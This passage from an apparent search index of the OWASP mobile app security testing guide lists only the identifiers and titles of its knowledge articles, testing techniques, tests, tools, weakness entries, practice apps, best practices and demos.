onReceivedSslError          </li> <li>            MASTG-DEMO-0057: Network Security Configuration Allows User-Added Certificates          </li> <li>            MASTG-DEMO-0060: App Writing Sensitive Data to Sandbox using EncryptedSharedPreferences          </li> <li>            MASTG-KNOW-0001: Biometric Authentication          </li> <li>            MASTG-KNOW-0002: FingerprintManager          </li> <li>            MASTG-KNOW-0003: App Signing          </li> <li>            MASTG-KNOW-0004: Third-Party Libraries          </li> <li>            MASTG-KNOW-0005: Memory Corruption Bugs          </li> <li>            MASTG-KNOW-0006: Binary Protection Mechanisms          </li> <li>            MASTG-KNOW-0007: Debuggable Apps          </li> <li>            MASTG-KNOW-0008: Debugging Symbols          </li> <li>            MASTG-KNOW-0009: StrictMode          </li> <li>            MASTG-KNOW-0010: Exception Handling          </li> <li>            MASTG-KNOW-0011: Security Provider          </li> <li>            MASTG-KNOW-0012: Key Generation          </li> <li>            MASTG-KNOW-0013: Random number generation          </li> <li>            MASTG-KNOW-0014: Android Network Security Configuration          </li> <li>            MASTG-KNOW-0015: Certificate Pinning          </li> <li>            MASTG-KNOW-0016: TBD          </li> <li>            MASTG-KNOW-0017: App Permissions          </li> <li>            MASTG-KNOW-0018: WebViews          </li> <li>            MASTG-KNOW-0019: Deep Links          </li> <li>            MASTG-KNOW-0020: Inter-Process Communication (IPC) Mechanisms          </li> <li>            MASTG-KNOW-0021: Object Serialization          </li> <li>            MASTG-KNOW-0022: Overlay Attacks          </li> <li>            MASTG-KNOW-0023: Enforced Updating          </li> <li>            MASTG-KNOW-0024: Pending Intents          </li> <li>            MASTG-KNOW-0025: Implicit Intents          </li> <li>            MASTG-KNOW-0026: Third-party Services Embedded in the App          </li> <li>            MASTG-KNOW-0027: Root Detection          </li> <li>            MASTG-KNOW-0028: Anti-Debugging          </li> <li>            MASTG-KNOW-0029: File Integrity Checks          </li> <li>            MASTG-KNOW-0030: Detection of Reverse Engineering Tools          </li> <li>            MASTG-KNOW-0031: Emulator Detection          </li> <li>            MASTG-KNOW-0032: Runtime Integrity Verification          </li> <li>            MASTG-KNOW-0033: Obfuscation          </li> <li>            MASTG-KNOW-0034: Device Binding          </li> <li>            MASTG-KNOW-0035: Google Play Integrity API          </li> <li>            MASTG-KNOW-0036: Shared Preferences          </li> <li>            MASTG-KNOW-0037: SQLite Database          </li> <li>            MASTG-KNOW-0038: SQLCipher Database          </li> <li>            MASTG-KNOW-0039: Firebase Real-time Databases          </li> <li>            MASTG-KNOW-0040: Realm Databases          </li> <li>            MASTG-KNOW-0041: Internal Storage          </li> <li>            MASTG-KNOW-0042: External Storage          </li> <li>            MASTG-KNOW-0043: Android KeyStore          </li> <li>            MASTG-KNOW-0044: Key Attestation          </li> <li>            MASTG-KNOW-0045: Secure Key Import into Keystore          </li> <li>            MASTG-KNOW-0046: BouncyCastle KeyStore          </li> <li>            MASTG-KNOW-0047: Cryptographic Key Storage          </li> <li>            MASTG-KNOW-0048: KeyChain          </li> <li>            MASTG-KNOW-0049: Logs          </li> <li>            MASTG-KNOW-0050: Backups          </li> <li>            MASTG-KNOW-0051: Process Memory          </li> <li>            MASTG-KNOW-0052: User Interface Components          </li> <li>            MASTG-KNOW-0053: Screenshots          </li> <li>            MASTG-KNOW-0054: App Notifications          </li> <li>            MASTG-KNOW-0055: Keyboard Cache          </li> <li>            MASTG-TECH-0001: Accessing the Device Shell          </li> <li>            MASTG-TECH-0002: Host-Device Data Transfer          </li> <li>            MASTG-TECH-0003: Obtaining and Extracting Apps          </li> <li>            MASTG-TECH-0004: Repackaging Apps          </li> <li>            MASTG-TECH-0005: Installing Apps          </li> <li>            MASTG-TECH-0006: Listing Installed Apps          </li> <li>            MASTG-TECH-0007: Exploring the App Package          </li> <li>            MASTG-TECH-0008: Accessing App Data Directories          </li> <li>            MASTG-TECH-0009: Monitoring System Logs          </li> <li>            MASTG-TECH-0010: Basic Network Monitoring/Sniffing          </li> <li>            MASTG-TECH-0011: Setting Up an Interception Proxy          </li> <li>            MASTG-TECH-0012: Bypassing Certificate Pinning          </li> <li>            MASTG-TECH-0013: Reverse Engineering Android Apps          </li> <li>            MASTG-TECH-0014: Static Analysis on Android          </li> <li>            MASTG-TECH-0015: Dynamic Analysis on Android          </li> <li>            MASTG-TECH-0016: Disassembling Code to Smali          </li> <li>            MASTG-TECH-0017: Decompiling Java Code          </li> <li>            MASTG-TECH-0018: Disassembling Native Code          </li> <li>            MASTG-TECH-0019: Retrieving Strings          </li> <li>            MASTG-TECH-0020: Retrieving Cross References          </li> <li>            MASTG-TECH-0021: Information Gathering - API Usage          </li> <li>            MASTG-TECH-0022: Information Gathering - Network Communication          </li> <li>            MASTG-TECH-0023: Reviewing Decompiled Java Code          </li> <li>            MASTG-TECH-0024: Reviewing Disassembled Native Code          </li> <li>            MASTG-TECH-0025: Automated Static Analysis          </li> <li>            MASTG-TECH-0026: Dynamic Analysis on Non-Rooted Devices          </li> <li>            MASTG-TECH-0027: Get Open Files          </li> <li>            MASTG-TECH-0028: Get Open Connections          </li> <li>            MASTG-TECH-0029: Get Loaded Native Libraries          </li> <li>            MASTG-TECH-0030: Sandbox Inspection          </li> <li>            MASTG-TECH-0031: Debugging          </li> <li>            MASTG-TECH-0032: Execution Tracing          </li> <li>            MASTG-TECH-0033: Method Tracing          </li> <li>            MASTG-TECH-0034: Native Code Tracing          </li> <li>            MASTG-TECH-0035: JNI Tracing          </li> <li>            MASTG-TECH-0036: Emulation-based Analysis          </li> <li>            MASTG-TECH-0037: Symbolic Execution          </li> <li>            MASTG-TECH-0038: Patching          </li> <li>            MASTG-TECH-0039: Repackaging &amp; Re-Signing          </li> <li>            MASTG-TECH-0040: Waiting for the Debugger          </li> <li>            MASTG-TECH-0041: Library Injection          </li> <li>            MASTG-TECH-0042: Getting Loaded Classes and Methods Dynamically          </li> <li>            MASTG-TECH-0043: Method Hooking          </li> <li>            MASTG-TECH-0044: Process Exploration          </li> <li>            MASTG-TECH-0045: Runtime Reverse Engineering          </li> <li>            MASTG-TECH-0100: Logging Sensitive Data from Network Traffic          </li> <li>            MASTG-TECH-0108: Taint Analysis          </li> <li>            MASTG-TECH-0109: Intercepting Flutter HTTPS Traffic          </li> <li>            MASTG-TECH-0112: Reverse Engineering Flutter Applications          </li> <li>            MASTG-TECH-0115: Obtaining Compiler-Provided Security Features          </li> <li>            MASTG-TECH-0116: Obtaining Information about the APK Signature          </li> <li>            MASTG-TECH-0117: Obtaining Information from the AndroidManifest          </li> <li>            MASTG-TECH-0126: Obtaining App Permissions          </li> <li>            MASTG-TECH-0127: Inspecting an App's Backup Data          </li> <li>            MASTG-TECH-0128: Performing a Backup and Restore of App Data          </li> <li>            MASTG-TECH-0129: Verifying Android Dependencies at Runtime          </li> <li>            MASTG-TECH-0130: Software Composition Analysis (SCA) of Android Dependencies by Creating a SBOM          </li> <li>            MASTG-TECH-0131: Software Composition Analysis (SCA) of Android Dependencies at Build Time          </li> <li>            MASTG-TEST-0001: Testing Local Storage for Sensitive Data          </li> <li>            MASTG-TEST-0002: Testing Local Storage for Input Validation          </li> <li>            MASTG-TEST-0003: Testing Logs for Sensitive Data          </li> <li>            MASTG-TEST-0004: Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services          </li> <li>            MASTG-TEST-0005: Determining Whether Sensitive Data Is Shared with Third Parties via Notifications          </li> <li>            MASTG-TEST-0006: Determining Whether the Keyboard Cache Is Disabled for Text Input Fields          </li> <li>            MASTG-TEST-0007: Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms          </li> <li>            MASTG-TEST-0008: Checking for Sensitive Data Disclosure Through the User Interface          </li> <li>            MASTG-TEST-0009: Testing Backups for Sensitive Data          </li> <li>            MASTG-TEST-0010: Finding Sensitive Information in Auto-Generated Screenshots          </li> <li>            MASTG-TEST-0011: Testing Memory for Sensitive Data          </li> <li>            MASTG-TEST-0012: Testing the Device-Access-Security Policy          </li> <li>            MASTG-TEST-0013: Testing Symmetric Cryptography          </li> <li>            MASTG-TEST-0014: Testing the Configuration of Cryptographic Standard Algorithms          </li> <li>            MASTG-TEST-0015: Testing the Purposes of Keys          </li> <li>            MASTG-TEST-0016: Testing Random Number Generation          </li> <li>            MASTG-TEST-0017: Testing Confirm Credentials          </li> <li>            MASTG-TEST-0018: Testing Biometric Authentication          </li> <li>            MASTG-TEST-0019: Testing Data Encryption on the Network          </li> <li>            MASTG-TEST-0020: Testing the TLS Settings          </li> <li>            MASTG-TEST-0021: Testing Endpoint Identify Verification          </li> <li>            MASTG-TEST-0022: Testing Custom Certificate Stores and Certificate Pinning          </li> <li>            MASTG-TEST-0023: Testing the Security Provider          </li> <li>            MASTG-TEST-0024: Testing for App Permissions          </li> <li>            MASTG-TEST-0025: Testing for Injection Flaws          </li> <li>            MASTG-TEST-0026: Testing Implicit Intents          </li> <li>            MASTG-TEST-0027: Testing for URL Loading in WebViews          </li> <li>            MASTG-TEST-0028: Testing Deep Links          </li> <li>            MASTG-TEST-0029: Testing for Sensitive Functionality Exposure Through IPC          </li> <li>            MASTG-TEST-0030: Testing for Vulnerable Implementation of PendingIntent          </li> <li>            MASTG-TEST-0031: Testing JavaScript Execution in WebViews          </li> <li>            MASTG-TEST-0032: Testing WebView Protocol Handlers          </li> <li>            MASTG-TEST-0033: Testing for Java Objects Exposed Through WebViews          </li> <li>            MASTG-TEST-0034: Testing Object Persistence          </li> <li>            MASTG-TEST-0035: Testing for Overlay Attacks          </li> <li>            MASTG-TEST-0036: Testing Enforced Updating          </li> <li>            MASTG-TEST-0037: Testing WebViews Cleanup          </li> <li>            MASTG-TEST-0038: Making Sure that the App is Properly Signed          </li> <li>            MASTG-TEST-0039: Testing whether the App is Debuggable          </li> <li>            MASTG-TEST-0040: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0041: Testing for Debugging Code and Verbose Error Logging          </li> <li>            MASTG-TEST-0042: Checking for Weaknesses in Third Party Libraries          </li> <li>            MASTG-TEST-0043: Memory Corruption Bugs          </li> <li>            MASTG-TEST-0044: Make Sure That Free Security Features Are Activated          </li> <li>            MASTG-TEST-0045: Testing Root Detection          </li> <li>            MASTG-TEST-0046: Testing Anti-Debugging Detection          </li> <li>            MASTG-TEST-0047: Testing File Integrity Checks          </li> <li>            MASTG-TEST-0048: Testing Reverse Engineering Tools Detection          </li> <li>            MASTG-TEST-0049: Testing Emulator Detection          </li> <li>            MASTG-TEST-0050: Testing Runtime Integrity Checks          </li> <li>            MASTG-TEST-0051: Testing Obfuscation          </li> <li>            MASTG-TEST-0200: Files Written to External Storage          </li> <li>            MASTG-TEST-0201: Runtime Use of APIs to Access External Storage          </li> <li>            MASTG-TEST-0202: References to APIs and Permissions for Accessing External Storage          </li> <li>            MASTG-TEST-0203: Runtime Use of Logging APIs          </li> <li>            MASTG-TEST-0204: Insecure Random API Usage          </li> <li>            MASTG-TEST-0205: Non-random Sources Usage          </li> <li>            MASTG-TEST-0206: Sensitive Data in Network Traffic Capture          </li> <li>            MASTG-TEST-0207: Data Stored in the App Sandbox at Runtime          </li> <li>            MASTG-TEST-0208: Insufficient Key Sizes          </li> <li>            MASTG-TEST-0212: Use of Hardcoded Cryptographic Keys in Code          </li> <li>            MASTG-TEST-0216: Sensitive Data Not Excluded From Backup          </li> <li>            MASTG-TEST-0217: Insecure TLS Protocols Explicitly Allowed in Code          </li> <li>            MASTG-TEST-0221: Broken Symmetric Encryption Algorithms          </li> <li>            MASTG-TEST-0222: Position Independent Code (PIC) Not Enabled          </li> <li>            MASTG-TEST-0223: Stack Canaries Not Enabled          </li> <li>            MASTG-TEST-0224: Usage of Insecure Signature Version          </li> <li>            MASTG-TEST-0225: Usage of Insecure Signature Key Size          </li> <li>            MASTG-TEST-0226: Debuggable Flag Enabled in the AndroidManifest          </li> <li>            MASTG-TEST-0227: Debugging Enabled for WebViews          </li> <li>            MASTG-TEST-0231: References to Logging APIs          </li> <li>            MASTG-TEST-0232: Broken Symmetric Encryption Modes          </li> <li>            MASTG-TEST-0233: Hardcoded HTTP URLs          </li> <li>            MASTG-TEST-0234: Missing Implementation of Server Hostname Verification with SSLSockets          </li> <li>            MASTG-TEST-0235: Android App Configurations Allowing Cleartext Traffic          </li> <li>            MASTG-TEST-0237: Cross-Platform Framework Configurations Allowing Cleartext Traffic          </li> <li>            MASTG-TEST-0238: Runtime Use of Network APIs Transmitting Cleartext Traffic          </li> <li>            MASTG-TEST-0239: Using low-level APIs (e.g. Socket) to set up a custom HTTP connection          </li> <li>            MASTG-TEST-0242: Missing Certificate Pinning in Network Security Configuration          </li> <li>            MASTG-TEST-0243: Expired Certificate Pins in the Network Security Configuration          </li> <li>            MASTG-TEST-0245: References to Platform Version APIs          </li> <li>            MASTG-TEST-0247: References to APIs for Detecting Secure Screen Lock          </li> <li>            MASTG-TEST-0249: Runtime Use of Secure Screen Lock Detection APIs          </li> <li>            MASTG-TEST-0250: References to Content Provider Access in WebViews          </li> <li>            MASTG-TEST-0251: Runtime Use of Content Provider Access APIs in WebViews          </li> <li>            MASTG-TEST-0252: References to Local File Access in WebViews          </li> <li>            MASTG-TEST-0253: Runtime Use of Local File Access APIs in WebViews          </li> <li>            MASTG-TEST-0254: Dangerous App Permissions          </li> <li>            MASTG-TEST-0255: Permission Requests Not Minimized          </li> <li>            MASTG-TEST-0256: Missing Permission Rationale          </li> <li>            MASTG-TEST-0257: Not Resetting Unused Permissions          </li> <li>            MASTG-TEST-0258: References to Keyboard Caching Attributes in UI Elements          </li> <li>            MASTG-TEST-0262: References to Backup Configurations Not Excluding Sensitive Data          </li> <li>            MASTG-TEST-0263: Logging of StrictMode Violations          </li> <li>            MASTG-TEST-0264: Runtime Use of StrictMode APIs          </li> <li>            MASTG-TEST-0265: References to StrictMode APIs          </li> <li>            MASTG-TEST-0272: Identify Dependencies with Known Vulnerabilities in the Android Project          </li> <li>            MASTG-TEST-0274: Dependencies with Known Vulnerabilities in the App's SBOM          </li> <li>            MASTG-TEST-0282: Unsafe Custom Trust Evaluation          </li> <li>            MASTG-TEST-0283: Incorrect Implementation of Server Hostname Verification          </li> <li>            MASTG-TEST-0284: Incorrect SSL Error Handling in WebViews          </li> <li>            MASTG-TEST-0285: Outdated Android Version Allowing Trust in User-Provided CAs          </li> <li>            MASTG-TEST-0286: Network Security Configuration Allowing Trust in User-Provided CAs          </li> <li>            MASTG-TEST-0287: Sensitive Data Stored Unencrypted via the SharedPreferences API to the App Sandbox          </li> <li>            MASTG-TOOL-0001: Frida for Android          </li> <li>            MASTG-TOOL-0002: MobSF for Android          </li> <li>            MASTG-TOOL-0003: nm - Android          </li> <li>            MASTG-TOOL-0004: adb          </li> <li>            MASTG-TOOL-0005: Android NDK          </li> <li>            MASTG-TOOL-0006: Android SDK          </li> <li>            MASTG-TOOL-0007: Android Studio          </li> <li>            MASTG-TOOL-0008: Android-SSL-TrustKiller          </li> <li>            MASTG-TOOL-0009: APKiD          </li> <li>            MASTG-TOOL-0010: APKLab          </li> <li>            MASTG-TOOL-0011: Apktool          </li> <li>            MASTG-TOOL-0012: apkx          </li> <li>            MASTG-TOOL-0013: Busybox          </li> <li>            MASTG-TOOL-0014: Bytecode Viewer          </li> <li>            MASTG-TOOL-0015: drozer          </li> <li>            MASTG-TOOL-0016: gplaycli          </li> <li>            MASTG-TOOL-0017: House          </li> <li>            MASTG-TOOL-0018: jadx          </li> <li>            MASTG-TOOL-0019: jdb          </li> <li>            MASTG-TOOL-0020: JustTrustMe          </li> <li>            MASTG-TOOL-0021: Magisk          </li> <li>            MASTG-TOOL-0022: Proguard          </li> <li>            MASTG-TOOL-0023: RootCloak Plus          </li> <li>            MASTG-TOOL-0024: Scrcpy          </li> <li>            MASTG-TOOL-0025: SSLUnpinning          </li> <li>            MASTG-TOOL-0026: Termux          </li> <li>            MASTG-TOOL-0027: Xposed          </li> <li>            MASTG-TOOL-0028: radare2 for Android          </li> <li>            MASTG-TOOL-0029: objection for Android          </li> <li>            MASTG-TOOL-0030: Angr          </li> <li>            MASTG-TOOL-0099: FlowDroid          </li> <li>            MASTG-TOOL-0103: uber-apk-signer          </li> <li>            MASTG-TOOL-0107: JNITrace          </li> <li>            MASTG-TOOL-0112: pidcat          </li> <li>            MASTG-TOOL-0116: Blutter          </li> <li>            MASTG-TOOL-0120: ProxyDroid          </li> <li>            MASTG-TOOL-0123: apksigner          </li> <li>            MASTG-TOOL-0124: aapt2          </li> <li>            MASTG-TOOL-0125: Apkleaks          </li> <li>            MASTG-TOOL-0130: blint          </li> <li>            MASTG-TOOL-0140: frida-multiple-unpinning          </li> <li>            MASWE-0001: Insertion of Sensitive Data into Logs          </li> <li>            MASWE-0002: Sensitive Data Stored With Insufficient Access Restrictions in Internal Locations          </li> <li>            MASWE-0003: Backup Unencrypted          </li> <li>            MASWE-0004: Sensitive Data Not Excluded From Backup          </li> <li>            MASWE-0005: API Keys Hardcoded in the App Package          </li> <li>            MASWE-0006: Sensitive Data Stored Unencrypted in Private Storage Locations          </li> <li>            MASWE-0007: Sensitive Data Stored Unencrypted in Shared Storage Requiring No User Interaction          </li> <li>            MASWE-0008: Missing Device Secure Lock Verification Implementation          </li> <li>            MASWE-0009: Improper Cryptographic Key Generation          </li> <li>            MASWE-0010: Improper Cryptographic Key Derivation          </li> <li>            MASWE-0011: Cryptographic Key Rotation Not Implemented          </li> <li>            MASWE-0012: Insecure or Wrong Usage of Cryptographic Key          </li> <li>            MASWE-0013: Hardcoded Cryptographic Keys in Use          </li> <li>            MASWE-0014: Cryptographic Keys Not Properly Protected at Rest          </li> <li>            MASWE-0015: Deprecated Android KeyStore Implementations          </li> <li>            MASWE-0016: Unsafe Handling of Imported Cryptographic Keys          </li> <li>            MASWE-0017: Cryptographic Keys Not Properly Protected on Export          </li> <li>            MASWE-0018: Cryptographic Keys Access Not Restricted          </li> <li>            MASWE-0019: Risky Cryptography Implementations          </li> <li>            MASWE-0020: Improper Encryption          </li> <li>            MASWE-0021: Improper Hashing          </li> <li>            MASWE-0022: Predictable Initialization Vectors (IVs)          </li> <li>            MASWE-0023: Risky Padding          </li> <li>            MASWE-0024: Improper Use of Message Authentication Code (MAC)          </li> <li>            MASWE-0025: Improper Generation of Cryptographic Signatures          </li> <li>            MASWE-0026: Improper Verification of Cryptographic Signature          </li> <li>            MASWE-0027: Improper Random Number Generation          </li> <li>            MASWE-0028: MFA Implementation Best Practices Not Followed          </li> <li>            MASWE-0029: Step-Up Authentication Not Implemented After Login          </li> <li>            MASWE-0030: Re-Authenticates Not Triggered On Contextual State Changes          </li> <li>            MASWE-0031: Insecure use of Android Protected Confirmation          </li> <li>            MASWE-0032: Platform-provided Authentication APIs Not Used          </li> <li>            MASWE-0033: Authentication or Authorization Protocol Security Best Practices Not Followed          </li> <li>            MASWE-0034: Insecure Implementation of Confirm Credentials          </li> <li>            MASWE-0035: Passwordless Authentication Not Implemented          </li> <li>            MASWE-0036: Authentication Material Stored Unencrypted on the Device          </li> <li>            MASWE-0037: Authentication Material Sent over Insecure Connections          </li> <li>            MASWE-0038: Authentication Tokens Not Validated          </li> <li>            MASWE-0039: Shared Web Credentials and Website-association Not Implemented          </li> <li>            MASWE-0040: Insecure Authentication in WebViews          </li> <li>            MASWE-0041: Authentication Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0042: Authorization Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0043: App Custom PIN Not Bound to Platform KeyStore          </li> <li>            MASWE-0044: Biometric Authentication Can Be Bypassed          </li> <li>            MASWE-0045: Fallback to Non-biometric Credentials Allowed for Sensitive Transactions          </li> <li>            MASWE-0046: Crypto Keys Not Invalidated on New Biometric Enrollment          </li> <li>            MASWE-0047: Insecure Identity Pinning          </li> <li>            MASWE-0048: Insecure Machine-to-Machine Communication          </li> <li>            MASWE-0049: Proven Networking APIs Not used          </li> <li>            MASWE-0050: Cleartext Traffic          </li> <li>            MASWE-0051: Unprotected Open Ports          </li> <li>            MASWE-0052: Insecure Certificate Validation          </li> <li>            MASWE-0053: Sensitive Data Leaked via the User Interface          </li> <li>            MASWE-0054: Sensitive Data Leaked via Notifications          </li> <li>            MASWE-0055: Sensitive Data Leaked via Screenshots          </li> <li>            MASWE-0056: Tapjacking Attacks          </li> <li>            MASWE-0057: StrandHogg Attack / Task Affinity Vulnerability          </li> <li>            MASWE-0058: Insecure Deep Links          </li> <li>            MASWE-0059: Use Of Unauthenticated Platform IPC          </li> <li>            MASWE-0062: Insecure Services          </li> <li>            MASWE-0063: Insecure Broadcast Receivers          </li> <li>            MASWE-0064: Insecure Content Providers          </li> <li>            MASWE-0065: Sensitive Data Permanently Shared with Other Apps          </li> <li>            MASWE-0066: Insecure Intents          </li> <li>            MASWE-0067: Debuggable Flag Not Disabled          </li> <li>            MASWE-0068: JavaScript Bridges in WebViews          </li> <li>            MASWE-0069: WebViews Allows Access to Local Resources          </li> <li>            MASWE-0070: JavaScript Loaded from Untrusted Sources          </li> <li>            MASWE-0071: WebViews Loading Content from Untrusted Sources          </li> <li>            MASWE-0072: Universal XSS          </li> <li>            MASWE-0073: Insecure WebResourceResponse Implementations          </li> <li>            MASWE-0074: Web Content Debugging Enabled          </li> <li>            MASWE-0075: Enforced Updating Not Implemented          </li> <li>            MASWE-0076: Dependencies with Known Vulnerabilities          </li> <li>            MASWE-0077: Running on a recent Platform Version Not Ensured          </li> <li>            MASWE-0078: Latest Platform Version Not Targeted          </li> <li>            MASWE-0079: Unsafe Handling of Data from the Network          </li> <li>            MASWE-0080: Unsafe Handling of Data from Backups          </li> <li>            MASWE-0081: Unsafe Handling Of Data From External Interfaces          </li> <li>            MASWE-0082: Unsafe Handling of Data From Local Storage          </li> <li>            MASWE-0083: Unsafe Handling of Data From The User Interface          </li> <li>            MASWE-0084: Unsafe Handling of Data from IPC          </li> <li>            MASWE-0085: Unsafe Dynamic Code Loading          </li> <li>            MASWE-0086: SQL Injection          </li> <li>            MASWE-0087: Insecure Parsing and Escaping          </li> <li>            MASWE-0088: Insecure Object Deserialization          </li> <li>            MASWE-0089: Code Obfuscation Not Implemented          </li> <li>            MASWE-0090: Resource Obfuscation Not Implemented          </li> <li>            MASWE-0091: Anti-Deobfuscation Techniques Not Implemented          </li> <li>            MASWE-0092: Static Analysis Tools Not Prevented          </li> <li>            MASWE-0093: Debugging Symbols Not Removed          </li> <li>            MASWE-0094: Non-Production Resources Not Removed          </li> <li>            MASWE-0095: Code That Disables Security Controls Not Removed          </li> <li>            MASWE-0096: Data Sent Unencrypted Over Encrypted Connections          </li> <li>            MASWE-0097: Root/Jailbreak Detection Not Implemented          </li> <li>            MASWE-0098: App Virtualization Environment Detection Not Implemented          </li> <li>            MASWE-0099: Emulator Detection Not Implemented          </li> <li>            MASWE-0100: Device Attestation Not Implemented          </li> <li>            MASWE-0101: Debugger Detection Not Implemented          </li> <li>            MASWE-0102: Dynamic Analysis Tools Detection Not Implemented          </li> <li>            MASWE-0103: RASP Techniques Not Implemented          </li> <li>            MASWE-0104: App Integrity Not Verified          </li> <li>            MASWE-0105: Integrity of App Resources Not Verified          </li> <li>            MASWE-0106: Official Store Verification Not Implemented          </li> <li>            MASWE-0107: Runtime Code Integrity Not Verified          </li> <li>            MASWE-0108: Sensitive Data in Network Traffic          </li> <li>            MASWE-0109: Lack of Anonymization or Pseudonymisation Measures          </li> <li>            MASWE-0110: Use of Unique Identifiers for User Tracking          </li> <li>            MASWE-0111: Inadequate Privacy Policy          </li> <li>            MASWE-0112: Inadequate Data Collection Declarations          </li> <li>            MASWE-0113: Lack of Proper Data Management Controls          </li> <li>            MASWE-0114: Inadequate Data Visibility Controls          </li> <li>            MASWE-0115: Inadequate or Ambiguous User Consent Mechanisms          </li> <li>            MASWE-0116: Compiler Provided Security Features Not Used          </li> <li>            MASWE-0117: Inadequate Permission Management          </li> </ul>","tags":[]},{"location":"tags/#tag:app","title":"app","text":"<ul> <li>            MASTG-APP-0001: AndroGoat          </li> <li>            MASTG-APP-0002: Android License Validator          </li> <li>            MASTG-APP-0003: Android UnCrackable L1          </li> <li>            MASTG-APP-0004: Android UnCrackable L2          </li> <li>            MASTG-APP-0005: Android UnCrackable L3          </li> <li>            MASTG-APP-0006: Digitalbank          </li> <li>            MASTG-APP-0007: DIVA Android          </li> <li>            MASTG-APP-0008: DodoVulnerableBank          </li> <li>            MASTG-APP-0009: DVHMA          </li> <li>            MASTG-APP-0010: InsecureBankv2          </li> <li>            MASTG-APP-0011: MASTG Hacking Playground (Java)          </li> <li>            MASTG-APP-0012: MASTG Hacking Playground (Kotlin)          </li> <li>            MASTG-APP-0013: OVAA          </li> <li>            MASTG-APP-0014: InsecureShop          </li> <li>            MASTG-APP-0015: Android UnCrackable L4          </li> <li>            MASTG-APP-0016: Finstergram          </li> <li>            MASTG-APP-0017: Disable-flutter-tls-verification          </li> <li>            MASTG-APP-0018: MASTestApp-Android-NETWORK          </li> <li>            MASTG-APP-0023: DVIA          </li> <li>            MASTG-APP-0024: DVIA-v2          </li> <li>            MASTG-APP-0025: iOS UnCrackable L1          </li> <li>            MASTG-APP-0026: iOS UnCrackable L2          </li> <li>            MASTG-APP-0027: Disable-flutter-tls-verification          </li> <li>            MASTG-APP-0028: iGoat-Swift          </li> </ul>","tags":[]},{"location":"tags/#tag:best","title":"best","text":"<ul> <li>            MASTG-BEST-0001: Use Secure Random Number Generator APIs          </li> <li>            MASTG-BEST-0002: Remove Logging Code          </li> <li>            MASTG-BEST-0003: Comply with Privacy Regulations and Best Practices          </li> <li>            MASTG-BEST-0004: Exclude Sensitive Data from Backups          </li> <li>            MASTG-BEST-0005: Use Secure Encryption Modes          </li> <li>            MASTG-BEST-0006: Use Up-to-Date APK Signing Schemes          </li> <li>            MASTG-BEST-0007: Debuggable Flag Disabled in the AndroidManifest          </li> <li>            MASTG-BEST-0008: Debugging Disabled for WebViews          </li> <li>            MASTG-BEST-0009: Use Secure Encryption Algorithms          </li> <li>            MASTG-BEST-0010: Use Up-to-Date minSdkVersion          </li> <li>            MASTG-BEST-0011: Securely Load File Content in a WebView          </li> <li>            MASTG-BEST-0012: Disable JavaScript in WebViews          </li> <li>            MASTG-BEST-0013: Disable Content Provider Access in WebViews          </li> </ul>","tags":[]},{"location":"tags/#tag:demo","title":"demo","text":"<ul> <li>            MASTG-DEMO-0001: File System Snapshots from External Storage          </li> <li>            MASTG-DEMO-0002: External Storage APIs Tracing with Frida          </li> <li>            MASTG-DEMO-0003: App Writing to External Storage without Scoped Storage Restrictions          </li> <li>            MASTG-DEMO-0004: App Writing to External Storage with Scoped Storage Restrictions          </li> <li>            MASTG-DEMO-0005: App Writing to External Storage via the MediaStore API          </li> <li>            MASTG-DEMO-0006: Tracing Common Logging APIs Looking for Secrets          </li> <li>            MASTG-DEMO-0007: Common Uses of Insecure Random APIs          </li> <li>            MASTG-DEMO-0008: Uses of Non-random Sources          </li> <li>            MASTG-DEMO-0009: Detecting Sensitive Data in Network Traffic          </li> <li>            MASTG-DEMO-0010: File System Snapshots from Internal Storage          </li> <li>            MASTG-DEMO-0011: Uses of Insufficient Key Size in SecKeyCreateRandomKey with r2          </li> <li>            MASTG-DEMO-0012: Cryptographic Key Generation With Insufficient Key Length          </li> <li>            MASTG-DEMO-0013: Use of Hardcoded RSA Private Key in SecKeyCreateWithData with r2          </li> <li>            MASTG-DEMO-0014: Use of Hardcoded ECDSA Private Key in CryptoKit with r2          </li> <li>            MASTG-DEMO-0015: Uses of Broken Hashing Algorithms in CommonCrypto with r2          </li> <li>            MASTG-DEMO-0016: Uses of Broken Hashing Algorithms in CryptoKit with r2          </li> <li>            MASTG-DEMO-0017: Use of Hardcoded AES Key in SecretKeySpec with semgrep          </li> <li>            MASTG-DEMO-0018: Uses of Broken Encryption Algorithms in CommonCrypto with r2          </li> <li>            MASTG-DEMO-0019: Uses of isExcludedFromBackupKey with r2          </li> <li>            MASTG-DEMO-0020: Data Exclusion using backup_rules.xml with Backup Manager          </li> <li>            MASTG-DEMO-0021: Uses of Jailbreak Detection Techniques with r2          </li> <li>            MASTG-DEMO-0022: Uses of Broken Symmetric Encryption Algorithms in Cipher with semgrep          </li> <li>            MASTG-DEMO-0023: Uses of Broken Encryption Modes in Cipher with semgrep          </li> <li>            MASTG-DEMO-0024: Uses of Caching UI Elements with semgrep          </li> <li>            MASTG-DEMO-0024: Uses of LAContext.canEvaluatePolicy with r2          </li> <li>            MASTG-DEMO-0025: Uses of Build.VERSION.SDK_INT with semgrep          </li> <li>            MASTG-DEMO-0026: Runtime Use of LAContext.canEvaluatePolicy with Frida          </li> <li>            MASTG-DEMO-0027: Runtime Use of KeyguardManager.isDeviceSecure and BiometricManager.canAuthenticate APIs with Frida          </li> <li>            MASTG-DEMO-0028: Uses of KeyguardManager.isDeviceSecure and BiometricManager.canAuthenticate with semgrep          </li> <li>            MASTG-DEMO-0029: Uses of WebViews Allowing Content Access with semgrep          </li> <li>            MASTG-DEMO-0030: Uses of WebViews Allowing Content Access with Frida          </li> <li>            MASTG-DEMO-0031: Uses of WebViews Allowing Local File Access with Frida          </li> <li>            MASTG-DEMO-0032: Uses of WebViews Allowing Local File Access with semgrep          </li> <li>            MASTG-DEMO-0033: Dangerous Permissions in the AndroidManifest with semgrep          </li> <li>            MASTG-DEMO-0034: Backup and Restore App Data with semgrep          </li> <li>            MASTG-DEMO-0035: Data Exclusion using backup_rules.xml with adb backup          </li> <li>            MASTG-DEMO-0036: Debuggable Entitlement Enabled in the entitlements.plist with rabin2          </li> <li>            MASTG-DEMO-0037: App Leaking Information about Unclosed SQL Cursor via StrictMode          </li> <li>            MASTG-DEMO-0038: Detecting StrictMode Uses with Frida          </li> <li>            MASTG-DEMO-0039: Detecting StrictMode PenaltyLog Usage with Semgrep          </li> <li>            MASTG-DEMO-0040: 